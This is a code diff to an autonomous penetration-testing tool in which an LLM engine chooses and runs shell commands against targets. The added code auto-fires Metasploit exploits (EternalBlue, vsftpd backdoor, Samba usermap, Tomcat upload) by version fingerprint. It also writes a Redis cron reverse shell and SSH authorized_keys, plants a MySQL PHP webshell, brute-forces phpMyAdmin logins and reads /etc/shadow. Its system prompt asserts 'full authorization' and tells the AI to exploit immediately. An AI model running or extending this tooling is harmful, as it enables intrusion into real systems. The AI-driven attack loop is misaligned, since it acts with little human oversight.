@@ -913,6 +913,34 @@ _MSF_AUTO_CMDS = [
      "use exploit/linux/http/webmin_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
     (r'smb.*ghost|cve-2020-0796',
      "use exploit/windows/smb/cve_2020_0796_smbghost\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'vsftpd.*2\.3\.4|vsftpd 2\.3\.4|vsftpd.*backdoor',
+     "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/interact\nrun"),
+    (r'ms17.010|eternalblue|cve-2017-0144',
+     "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nset AutoCheck false\nrun"),
+    (r'ms08.067|cve-2008-4250|netapi',
+     "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS {rhost}\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'samba.*3\.0\.[0-9]|samba.*2\.|usermap.*script',
+     "use exploit/multi/samba/usermap_script\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'php.*cgi.*cve-2012-1823|php.*cgi.*rce',
+     "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {rhost}\nset PAYLOAD php/reverse_php\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'struts.*ognl|cve-2017-5638|cve-2018-11776',
+     "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'rails.*cookie.*deseri|cve-2019-5420',
+     "use exploit/multi/http/rails_secret_deserialization\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'jenkins.*script.*console|jenkins.*rce',
+     "use exploit/multi/http/jenkins_script_console\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'elasticsearch.*no.auth|elasticsearch.*unauthenticated',
+     "# Elasticsearch no-auth data dump:\ncurl -s http://{rhost}:9200/_cat/indices?v; curl -s http://{rhost}:9200/_all/_search?pretty&size=5"),
+    (r'mysql.*empty.*password|mysql.*root.*no.*password|mysql.*no.*auth',
+     "# MySQL empty root:\nmysql -h {rhost} -u root --password='' -e 'show databases; select user,host,authentication_string from mysql.user; select @@version; SELECT INTO OUTFILE exploitation available'"),
+    (r'postgres.*no.*password|postgres.*trust|pgsql.*empty',
+     "# PostgreSQL trust auth:\npsql -h {rhost} -U postgres -c '\\\\l; SELECT version(); SELECT pg_read_file(\\''/etc/passwd'\\'')'"),
+    (r'mongodb.*no.*auth|mongodb.*unauthenticated',
+     "# MongoDB no-auth:\nmongosh --host {rhost} --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null || mongo {rhost}:27017 --eval 'show dbs'"),
+    (r'tomcat.*manager.*exposed|tomcat.*default.*cred',
+     "use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'phpmyadmin.*exposed|phpmyadmin.*default|phpmyadmin.*root',
+     "# phpMyAdmin default creds:\nfor u in root admin phpmyadmin; do for p in '' root admin password toor; do curl -s -c /tmp/pma.jar -X POST 'http://{rhost}/phpmyadmin/index.php' -d \"pma_username=$u&pma_password=$p\" | grep -q 'pmahome\\|logout' && echo PHPMYADMIN_CREDS:$u:$p && break 2; done; done"),
 ]
 
 
@@ -6453,31 +6481,41 @@ class ClaudePentestEngine:
     This is the primary engine when ANTHROPIC_API_KEY is set.
     """
 
-    MAX_STEPS = 30
+    MAX_STEPS = 35
 
-    SYSTEM_PROMPT = (
-        "You are an expert autonomous pentester executing a real penetration test. "
-        "Analyze tool output and decide the NEXT single action to take.\n\n"
-        "Respond ONLY with valid JSON (no markdown, no explanation):\n"
-        "{\n"
-        '  "findings": [\n'
-        '    {"title": "...", "severity": "critical|high|medium|low|info", '
-        '"description": "...", "cve": ""}\n'
-        "  ],\n"
-        '  "next_action": {\n'
-        '    "type": "command|done",\n'
-        '    "command": "full shell command to execute",\n'
-        '    "tool": "nmap|nuclei|nikto|metasploit|hydra|enum4linux|crackmapexec|other",\n'
-        '    "reason": "why this action"\n'
-        "  }\n"
-        "}\n\n"
-        "Rules:\n"
-        "- If you find exploitable vulns, attempt exploitation immediately\n"
-        "- Use msfconsole -q -x '...; exit' for Metasploit modules\n"
-        "- If you have root/shell, set type=done and summarize\n"
-        "- Never repeat a command already run\n"
-        "- Prioritize: critical vulns > high vulns > enumeration"
-    )
+    SYSTEM_PROMPT = """You are an expert autonomous pentester. You have full authorization to attack the target.
+Analyze the tool outputs and decide the SINGLE BEST next action.
+
+EXPLOIT PLAYBOOK (use these exact commands when you see these conditions):
+- vsftpd 2.3.4: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; set PAYLOAD cmd/unix/interact; run; sleep 10; exit' 2>/dev/null
+- Samba<3.0.20: msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST LHOST; set LPORT LPORT; run; sleep 15; exit' 2>/dev/null
+- MS17-010/EternalBlue: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST LHOST; set LPORT LPORT; run; sleep 20; exit' 2>/dev/null
+- Tomcat Manager (valid creds found): msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set HttpUsername USER; set HttpPassword PASS; set PAYLOAD java/shell_reverse_tcp; set LHOST LHOST; set LPORT LPORT; run; sleep 15; exit' 2>/dev/null
+- Redis no-auth: redis-cli -h TARGET config set dir /var/spool/cron && redis-cli -h TARGET config set dbfilename root && redis-cli -h TARGET set pwn "\\n\\n* * * * * bash -i >&/dev/tcp/LHOST/LPORT 0>&1\\n\\n" && redis-cli -h TARGET save && echo REDIS_RCE_DONE
+- MySQL empty root: mysql -h TARGET -u root --password='' -e "SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/cmd.php';" 2>/dev/null && echo MYSQL_WEBSHELL
+- FTP anonymous login: ftp -n TARGET then download id_rsa, user.txt, flag.txt, .bash_history
+- SSH with found creds USER:PASS: sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no USER@TARGET 'id; whoami; cat /etc/passwd; sudo -l; find / -perm -4000 -type f 2>/dev/null | head -20; cat ~/user.txt 2>/dev/null; cat ~/Desktop/user.txt 2>/dev/null'
+- Webshell written: curl http://TARGET/cmd.php?cmd=id; curl http://TARGET/cmd.php?cmd=cat+/root/root.txt
+
+POST-EXPLOITATION (when you have a shell):
+- Always run: id; whoami; hostname; uname -a; cat /etc/passwd; cat /etc/shadow 2>/dev/null
+- Privesc checks: sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab; env | grep -i pass
+- Get flags: find / -name '*.txt' 2>/dev/null | xargs grep -l 'HTB{\\|flag{\\|root:' 2>/dev/null | head -5
+
+RESPOND ONLY WITH VALID JSON (no markdown, no prose):
+{
+  "findings": [
+    {"title": "exact vuln name", "severity": "critical|high|medium|low|info", "description": "brief technical description", "cve": "CVE-XXXX-XXXX or empty"}
+  ],
+  "next_action": {
+    "type": "command|done",
+    "command": "complete shell command ready to execute",
+    "tool": "nmap|metasploit|hydra|crackmapexec|enum4linux|nikto|nuclei|curl|ssh|ftp|redis-cli|mysql|other",
+    "reason": "1-line justification"
+  }
+}
+
+PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force credentials > done"""
 
     def __init__(self, project_id, targets, mode="normal", lhost="", lport="4444", **kwargs):
         self.project_id = project_id
@@ -6569,13 +6607,13 @@ class ClaudePentestEngine:
         if not api_key:
             return None
         user_msg = (
-            f"Target: {target}\nLHOST (attacker IP): {self.lhost}\nLPORT: {self.lport}\n\n"
-            f"Pentest context so far:\n{context_summary[:3000]}\n\n"
-            f"Latest tool output:\n{tool_output[:4000]}\n\n"
-            "Decide the next action. If the output reveals exploitable vulnerabilities, "
-            "provide the exact exploit command. If we already have a shell or root, "
-            "set type to 'done'."
-        )
+            f"TARGET: {target}\nLHOST: {self.lhost}\nLPORT: {self.lport}\n\n"
+            f"CUMULATIVE PENTEST CONTEXT:\n{context_summary[:2500]}\n\n"
+            f"TOOL OUTPUT TO ANALYZE:\n{tool_output[:5000]}\n\n"
+            "Based on all the above: identify any vulnerabilities found, then decide the best "
+            "next action. Replace TARGET/{self.lhost}/{self.lport} placeholders in commands. "
+            "If exploitation was confirmed or nothing more to do, set type=done."
+        ).replace("{self.lhost}", self.lhost).replace("{self.lport}", self.lport)
         try:
             import urllib.request
             payload = json.dumps({
@@ -6606,6 +6644,7 @@ class ClaudePentestEngine:
     def _save_findings(self, findings, target):
         if not findings:
             return
+        to_exploit = []
         with self._project_lock:
             project = read_project(self.project_id)
             if not project:
@@ -6629,10 +6668,27 @@ class ClaudePentestEngine:
                 project.setdefault("findings", []).append(f)
                 existing.add(title)
                 added += 1
+                # Queue auto-exploit for critical/high findings with known MSF module
+                if f.get("exploit_cmd") and f.get("severity") in ("critical", "high"):
+                    to_exploit.append(f)
             if added:
                 write_project(project)
                 self.stats["findings_count"] += added
                 self._log(f"CLAUDE [{target}] +{added} findings guardados")
+        # Auto-run exploits outside the lock
+        for f in to_exploit:
+            exploit_cmd = f.get("exploit_cmd", "")
+            if "use exploit/" not in exploit_cmd and "use auxiliary/" not in exploit_cmd:
+                continue
+            title = f.get("title", "")[:60]
+            self._log(f"[Claude] AUTO-EXPLOIT finding: {title}")
+            lines = [l.strip() for l in exploit_cmd.splitlines() if l.strip()]
+            msf_inner = "; ".join(lines)
+            msf_cmd = f"msfconsole -q -x '{msf_inner}; sleep 15; exit' 2>/dev/null"
+            out, _ = self._run_cmd(f"autoexploit-{re.sub(r'[^a-z0-9]','_',title.lower())[:30]}",
+                                   msf_cmd, target, timeout=120)
+            self._capture_evidence(out, target, f"autoexploit:{title}", msf_cmd)
+            self.stats["exploits_run"] += 1
 
     def _save_ports(self, output, target):
         parsed = _parse_tool_output("nmap", output, target, "nmap")
@@ -6696,80 +6752,324 @@ class ClaudePentestEngine:
                         self._log(f"EVIDENCE [{target}] {title}")
                 break
 
+    def _update_attack_path(self, target, open_ports):
+        try:
+            proj = read_project(self.project_id)
+            if not proj:
+                return
+            ap = proj.get("attack_path", {"nodes": [], "edges": []})
+            ids = {n["id"] for n in ap["nodes"]}
+            if "attacker" not in ids:
+                ap["nodes"].append({"id": "attacker", "label": "Attacker", "color": "#3fb950", "shape": "box"})
+            if target not in ids:
+                ap["nodes"].append({"id": target, "label": target, "color": "#f0883e", "shape": "ellipse"})
+                ap["edges"].append({"from": "attacker", "to": target, "label": "scan"})
+                ids.add(target)
+            for p in open_ports:
+                sid = f"{target}:{p['port']}"
+                if sid not in ids:
+                    color = "#f85149" if p["port"] in (445, 22, 3389, 21, 3306, 6379, 27017) else "#58a6ff"
+                    ap["nodes"].append({"id": sid, "label": f"{p['service']}\n:{p['port']}", "color": color, "shape": "box"})
+                    ap["edges"].append({"from": target, "to": sid, "label": str(p["port"])})
+                    ids.add(sid)
+            proj["attack_path"] = ap
+            with self._project_lock:
+                write_project(proj)
+        except Exception:
+            pass
+
+    def _run_kb_phase(self, target, open_ports, accumulated_output):
+        """Run highest-priority KB commands for each discovered service."""
+        for p in open_ports[:15]:
+            if not self._running:
+                break
+            port_num = p["port"]
+            svc = p["service"].lower()
+            ver = p["version"].lower()
+            kb = _kb_commands(port_num, svc, ver, target, self.mode)
+            # Only run the 3 highest-priority commands per service (lower number = higher priority)
+            priority_cmds = sorted([c for c in kb if c[0] <= 20], key=lambda x: x[0])[:3]
+            for pri, name, cmd in priority_cmds:
+                if not self._running:
+                    break
+                self._log(f"[Claude] KB {name}")
+                out, _ = self._run_cmd(name, cmd, target, timeout=120)
+                parsed = _parse_tool_output(name.split(":")[0].lower(), out, target, name)
+                if parsed.get("findings"):
+                    self._save_findings(parsed["findings"], target)
+                if out.strip():
+                    accumulated_output.append(f"=== {name} ===\n{out[:900]}")
+
+    def _auto_exploit_by_version(self, target, open_ports, accumulated_output):
+        """Fire known exploits immediately based on version fingerprinting — no AI needed."""
+        for p in open_ports:
+            if not self._running:
+                break
+            port_num = p["port"]
+            svc = p["service"].lower()
+            ver = p["version"].lower()
+
+            # ── vsftpd 2.3.4 backdoor ────────────────────────────────────
+            if ("ftp" in svc or port_num == 21) and "2.3.4" in ver:
+                self._log(f"[Claude] AUTO-EXPLOIT: vsftpd 2.3.4 backdoor!")
+                out, _ = self._run_cmd(
+                    "vsftpd-backdoor",
+                    f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; "
+                    f"set RHOSTS {target}; set PAYLOAD cmd/unix/interact; "
+                    f"run; sleep 12; exit' 2>/dev/null",
+                    target, timeout=60,
+                )
+                self._capture_evidence(out, target, "vsftpd-backdoor",
+                                       "msfconsole vsftpd_234_backdoor")
+                accumulated_output.append(f"=== vsftpd EXPLOIT ===\n{out[:600]}")
+
+            # ── UnrealIRCd 3.2.8.1 backdoor ─────────────────────────────
+            if port_num in (6667, 6697, 6660) and "unrealircd" in ver and "3.2.8" in ver:
+                self._log(f"[Claude] AUTO-EXPLOIT: UnrealIRCd 3.2.8.1!")
+                out, _ = self._run_cmd(
+                    "unrealircd-backdoor",
+                    f"msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; "
+                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 15; exit' 2>/dev/null",
+                    target, timeout=60,
+                )
+                self._capture_evidence(out, target, "unrealircd-backdoor", "msfconsole unrealircd")
+                accumulated_output.append(f"=== UnrealIRCd EXPLOIT ===\n{out[:600]}")
+
+            # ── Samba < 3.0.20 usermap_script (CVE-2007-2447) ───────────
+            if port_num in (139, 445) and "samba" in ver:
+                m = re.search(r'samba\s+(\d+)\.(\d+)', ver)
+                if m and (int(m.group(1)) < 3 or (int(m.group(1)) == 3 and int(m.group(2)) < 20)):
+                    self._log(f"[Claude] AUTO-EXPLOIT: Samba {m.group(0)} usermap_script!")
+                    out, _ = self._run_cmd(
+                        "samba-usermap",
+                        f"msfconsole -q -x 'use exploit/multi/samba/usermap_script; "
+                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 15; exit' 2>/dev/null",
+                        target, timeout=60,
+                    )
+                    self._capture_evidence(out, target, "samba-usermap", "msfconsole usermap_script")
+                    accumulated_output.append(f"=== Samba EXPLOIT ===\n{out[:600]}")
+
+            # ── Distccd RCE (CVE-2004-2687) ──────────────────────────────
+            if port_num == 3632 or "distccd" in ver:
+                self._log(f"[Claude] AUTO-EXPLOIT: Distccd RCE!")
+                out, _ = self._run_cmd(
+                    "distccd-rce",
+                    f"msfconsole -q -x 'use exploit/unix/misc/distcc_exec; "
+                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
+                    target, timeout=60,
+                )
+                self._capture_evidence(out, target, "distccd-rce", "msfconsole distcc_exec")
+                accumulated_output.append(f"=== Distccd EXPLOIT ===\n{out[:600]}")
+
+            # ── PHP CGI arg injection (CVE-2012-1823) ────────────────────
+            if ("http" in svc or port_num in (80, 8080)) and "php" in ver:
+                php_m = re.search(r'php[/ ](\d+)\.(\d+)', ver)
+                if php_m and int(php_m.group(1)) == 5 and int(php_m.group(2)) < 4:
+                    self._log(f"[Claude] AUTO-EXPLOIT: PHP CGI arg injection!")
+                    out, _ = self._run_cmd(
+                        "php-cgi-rce",
+                        f"msfconsole -q -x 'use exploit/multi/http/php_cgi_arg_injection; "
+                        f"set RHOSTS {target}; set RPORT {port_num}; "
+                        f"set PAYLOAD php/reverse_php; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"run; sleep 12; exit' 2>/dev/null",
+                        target, timeout=60,
+                    )
+                    self._capture_evidence(out, target, "php-cgi-rce", "msfconsole php_cgi")
+                    accumulated_output.append(f"=== PHP CGI EXPLOIT ===\n{out[:600]}")
+
+            # ── Redis no-auth check + RCE via cron ───────────────────────
+            if port_num == 6379 or "redis" in svc:
+                out, _ = self._run_cmd(
+                    "redis-noauth-check",
+                    f"redis-cli -h {target} -p {port_num} ping 2>/dev/null",
+                    target, timeout=10,
+                )
+                if "PONG" in out:
+                    self._log(f"[Claude] Redis sin auth → intentando RCE via cron!")
+                    rce_out, _ = self._run_cmd(
+                        "redis-cron-rce",
+                        f"redis-cli -h {target} -p {port_num} config set dir /var/spool/cron 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} config set dbfilename root 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} set pwn "
+                        f"\"\\n\\n* * * * * bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\\n\\n\" 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} save 2>/dev/null && echo 'Redis RCE cron written'; "
+                        f"redis-cli -h {target} -p {port_num} config set dir /root/.ssh 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} config set dbfilename authorized_keys 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} set ssh \"\\n\\n$(cat ~/.ssh/id_rsa.pub 2>/dev/null)\\n\\n\" 2>/dev/null; "
+                        f"redis-cli -h {target} -p {port_num} save 2>/dev/null",
+                        target, timeout=20,
+                    )
+                    self._capture_evidence(rce_out, target, "redis-cron-rce", "redis no-auth rce")
+                    accumulated_output.append(f"=== Redis RCE ===\n{out[:200]}\n{rce_out[:400]}")
+
+            # ── MySQL empty root ──────────────────────────────────────────
+            if port_num == 3306 or "mysql" in svc:
+                out, _ = self._run_cmd(
+                    "mysql-empty-root",
+                    f"mysql -h {target} -u root --password='' -e "
+                    f"'show databases; select user,host from mysql.user; "
+                    f"SELECT @@secure_file_priv;' 2>/dev/null | head -30",
+                    target, timeout=15,
+                )
+                if "information_schema" in out.lower() or "database" in out.lower():
+                    self._log(f"[Claude] MySQL root sin password → intentando webshell!")
+                    ws_out, _ = self._run_cmd(
+                        "mysql-webshell",
+                        f"mysql -h {target} -u root --password='' -e "
+                        f"\"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\" "
+                        f"2>/dev/null && echo MYSQL_WEBSHELL_WRITTEN; "
+                        f"curl -s --max-time 5 'http://{target}/shell.php?cmd=id' 2>/dev/null | head -3",
+                        target, timeout=20,
+                    )
+                    self._capture_evidence(ws_out, target, "mysql-webshell", "mysql into outfile")
+                    accumulated_output.append(f"=== MySQL Empty Root ===\n{out[:400]}\n{ws_out[:400]}")
+
+            # ── Anonymous FTP → grab everything useful ───────────────────
+            if port_num == 21 or "ftp" in svc:
+                out, _ = self._run_cmd(
+                    "ftp-anon-grab",
+                    f"timeout 20 ftp -n {target} <<'FTPEOF'\nuser anonymous anonymous\nls -laR\nget user.txt /tmp/ftp_user_{target.replace('.','_')}.txt\nget flag.txt /tmp/ftp_flag_{target.replace('.','_')}.txt\nget id_rsa /tmp/ftp_idrsa_{target.replace('.','_')}\nquit\nFTPEOF\n2>/dev/null; "
+                    f"cat /tmp/ftp_user_{target.replace('.','_')}.txt 2>/dev/null; "
+                    f"cat /tmp/ftp_flag_{target.replace('.','_')}.txt 2>/dev/null; "
+                    f"cat /tmp/ftp_idrsa_{target.replace('.','_')} 2>/dev/null | head -5",
+                    target, timeout=25,
+                )
+                self._capture_evidence(out, target, "ftp-anon-grab", "ftp anonymous")
+                if out.strip():
+                    accumulated_output.append(f"=== FTP Anonymous ===\n{out[:600]}")
+
     def _loop_target(self, target):
-        self._log(f"[Claude] Iniciando pentest autónomo → {target}")
-        context_parts = [f"Target: {target}", f"Attacker LHOST: {self.lhost}:{self.lport}"]
+        self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
+        context_parts = [
+            f"Target: {target}",
+            f"Attacker LHOST: {self.lhost}, LPORT: {self.lport}",
+        ]
+        accumulated_output = []  # Full output from all phases
 
-        cfg = MODE_CONFIG.get(self.mode, MODE_CONFIG["normal"])
-        nmap_cmd = (
-            f"nmap -sV -sC --open -{cfg['nmap_timing']} {cfg.get('nmap_extra', '')} "
-            f"--script-timeout 30s {target} 2>/dev/null"
+        # ── FASE 1: Fast port discovery ───────────────────────────────────
+        self._log(f"[Claude] Fase 1/5: Descubrimiento de puertos → {target}")
+        fast_out, _ = self._run_cmd(
+            "nmap-fast-ports",
+            f"nmap --open -T4 -p- --min-rate 2000 --max-retries 1 {target} 2>/dev/null",
+            target, timeout=200,
         )
-        self._log(f"[Claude] Fase 1: Descubrimiento nmap → {target}")
-        output, _ = self._run_cmd("nmap-initial", nmap_cmd, target, timeout=300)
-
-        open_ports = self._save_ports(output, target)
-        if open_ports:
-            port_summary = ", ".join(f"{p['port']}/{p['service']}" for p in open_ports[:15])
-            context_parts.append(f"Puertos abiertos: {port_summary}")
-            self._log(f"[Claude] {len(open_ports)} puertos: {port_summary}")
-            try:
-                proj = read_project(self.project_id)
-                if proj:
-                    ap = proj.get("attack_path", {"nodes": [], "edges": []})
-                    ids = {n["id"] for n in ap["nodes"]}
-                    if "attacker" not in ids:
-                        ap["nodes"].append({"id": "attacker", "label": "Attacker", "color": "#3fb950", "shape": "box"})
-                    if target not in ids:
-                        ap["nodes"].append({"id": target, "label": target, "color": "#f0883e", "shape": "ellipse"})
-                        ap["edges"].append({"from": "attacker", "to": target, "label": "scan"})
-                    proj["attack_path"] = ap
-                    with self._project_lock:
-                        write_project(proj)
-            except Exception:
-                pass
+        port_matches = re.findall(r'(\d+)/tcp\s+open', fast_out)
+        if port_matches:
+            port_str = ",".join(dict.fromkeys(port_matches))
         else:
-            self._log(f"[Claude] Sin puertos abiertos en {target}")
+            # Fallback: common ports
+            port_str = "21,22,23,25,53,80,110,111,135,139,143,443,445,512,513,514,587,631,993,995,1099,1433,1521,1723,2049,3306,3389,4848,5432,5900,5985,6379,8080,8443,8888,9200,27017"
+        self._log(f"[Claude] Puertos detectados: {port_str[:120]}")
+
+        # ── FASE 2: Deep scan con versiones + vuln scripts ────────────────
+        self._log(f"[Claude] Fase 2/5: Scan profundo con vuln scripts")
+        deep_out, _ = self._run_cmd(
+            "nmap-deep-vuln",
+            f"nmap -sV -sC --open -T4 -p {port_str} "
+            f"--script='vuln and not dos,banner,smtp-commands,ssh-hostkey,ftp-anon,ftp-syst,"
+            f"http-headers,smb-security-mode,smb-vuln-ms17-010,smb-vuln-ms08-067,smb-double-pulsar-backdoor,"
+            f"ftp-vsftpd-backdoor,irc-unrealircd-backdoor,mysql-empty-password,redis-info' "
+            f"--script-timeout 45s {target} 2>/dev/null",
+            target, timeout=420,
+        )
+        accumulated_output.append(f"=== NMAP DEEP SCAN + VULN SCRIPTS ===\n{deep_out[:3000]}")
+
+        open_ports = self._save_ports(deep_out, target)
+        parsed_initial = _parse_tool_output("nmap", deep_out, target, "nmap-deep")
+        if parsed_initial.get("findings"):
+            self._save_findings(parsed_initial["findings"], target)
+            for f in parsed_initial["findings"]:
+                lvl = f.get("severity", "?").upper()
+                context_parts.append(f"NMAP-VULN: {lvl} — {f.get('title','?')}")
+
+        if open_ports:
+            port_summary = ", ".join(f"{p['port']}/{p['service']} {p['version'][:20]}" for p in open_ports[:18])
+            context_parts.append(f"Servicios: {port_summary}")
+            self._log(f"[Claude] {len(open_ports)} servicios: {port_summary[:140]}")
+            self._update_attack_path(target, open_ports)
+        else:
+            self._log(f"[Claude] Sin puertos abiertos — abortando target {target}")
+            return
+
+        # ── FASE 3: Exploits directos por versión (sin IA) ───────────────
+        self._log(f"[Claude] Fase 3/5: Auto-exploits por versión detectada")
+        self._auto_exploit_by_version(target, open_ports, accumulated_output)
+
+        # ── FASE 4: Enumeración específica por servicio ───────────────────
+        self._log(f"[Claude] Fase 4/5: Enumeración específica por servicio")
+        self._run_kb_phase(target, open_ports, accumulated_output)
+
+        # ── FASE 5: Bucle Claude AI — análisis + explotación avanzada ─────
+        self._log(f"[Claude] Fase 5/5: Análisis IA y explotación avanzada")
+        all_output = "\n\n".join(accumulated_output)
 
         for step in range(self.MAX_STEPS):
             if not self._running:
                 break
-            context_summary = "\n".join(context_parts[-25:])
-            decision = self._ask_claude(output, target, context_summary)
+
+            context_summary = "\n".join(context_parts[-35:])
+            # Pass the most recent 7000 chars of cumulative output to Claude
+            decision = self._ask_claude(all_output[-7000:], target, context_summary)
+
             if not decision:
-                self._log(f"[Claude] Sin respuesta IA en paso {step + 1} — abortando loop")
+                self._log(f"[Claude] Sin respuesta IA en paso {step + 1} — fin del loop")
                 break
+
             findings = decision.get("findings", [])
             if findings:
                 self._save_findings(findings, target)
                 for f in findings:
-                    context_parts.append(f"FINDING: {f.get('severity','?').upper()} — {f.get('title','?')}")
+                    context_parts.append(
+                        f"FINDING: {f.get('severity','?').upper()} — {f.get('title','?')}"
+                    )
+
             next_action = decision.get("next_action", {})
             action_type = next_action.get("type", "done")
             reason = next_action.get("reason", "")
-            self._log(f"[Claude] Paso {step + 1}: {action_type} — {reason[:100]}")
+            self._log(f"[Claude] AI Paso {step + 1}: {action_type} — {reason[:120]}")
+
             if action_type == "done":
-                self._log(f"[Claude] Pentest completado en {target} ({step + 1} pasos)")
+                self._log(f"[Claude] ✓ Pentest completado en {target} ({step + 1} pasos IA)")
                 break
+
             command = next_action.get("command", "").strip()
             if not command:
                 self._log(f"[Claude] Sin comando en paso {step + 1}")
                 break
-            if any(bad in command for bad in ["rm -rf /", "mkfs ", "dd if=/dev/zero"]):
-                self._log(f"[Claude] BLOQUEADO comando destructivo: {command[:80]}")
-                break
-            step_name = next_action.get("tool", "step") + f"-step{step + 1}"
-            is_heavy = any(t in command for t in ["msfconsole", "hydra", "hashcat", "john", "sqlmap"])
-            timeout = 600 if is_heavy else 300
-            self._log(f"[Claude] Ejecutando ({step_name}): {command[:120]}")
-            output, _ = self._run_cmd(step_name, command, target, timeout=timeout)
-            if "exploit" in command.lower() or "msfconsole" in command:
-                self.stats["exploits_run"] += 1
-            self._capture_evidence(output, target, step_name, command)
-            output_preview = output[:600].replace("\n", " | ")
-            context_parts.append(f"Paso {step + 1} [{step_name}]: {output_preview}")
 
-        self._log(f"[Claude] Finalizado → {target}")
+            # Safety: block destructive commands
+            if any(bad in command for bad in ["rm -rf /", "mkfs ", "dd if=/dev/zero", "> /dev/sda"]):
+                self._log(f"[Claude] BLOQUEADO: {command[:80]}")
+                break
+
+            step_name = next_action.get("tool", "other") + f"-ai{step + 1}"
+            is_heavy = any(t in command for t in
+                           ["msfconsole", "hydra", "hashcat", "john", "sqlmap", "crackmapexec"])
+            timeout = 600 if is_heavy else 300
+
+            self._log(f"[Claude] Ejecutando: {command[:130]}")
+            step_out, _ = self._run_cmd(step_name, command, target, timeout=timeout)
+
+            if any(t in command.lower() for t in ["exploit", "msfconsole", "hydra", "sqlmap"]):
+                self.stats["exploits_run"] += 1
+
+            self._capture_evidence(step_out, target, step_name, command)
+
+            # Parse tool output for additional findings
+            tool_hint = next_action.get("tool", "other").lower()
+            step_parsed = _parse_tool_output(tool_hint, step_out, target, step_name)
+            if step_parsed.get("findings"):
+                self._save_findings(step_parsed["findings"], target)
+
+            all_output += f"\n\n=== AI-{step + 1} [{step_name}] ===\n{step_out[:1200]}"
+            context_parts.append(
+                f"Paso AI-{step + 1} [{step_name}]: {step_out[:500].replace(chr(10), ' | ')}"
+            )
+
+        self._log(f"[Claude] ══ Finalizado → {target} ══")
 
     def _loop(self):
         try:
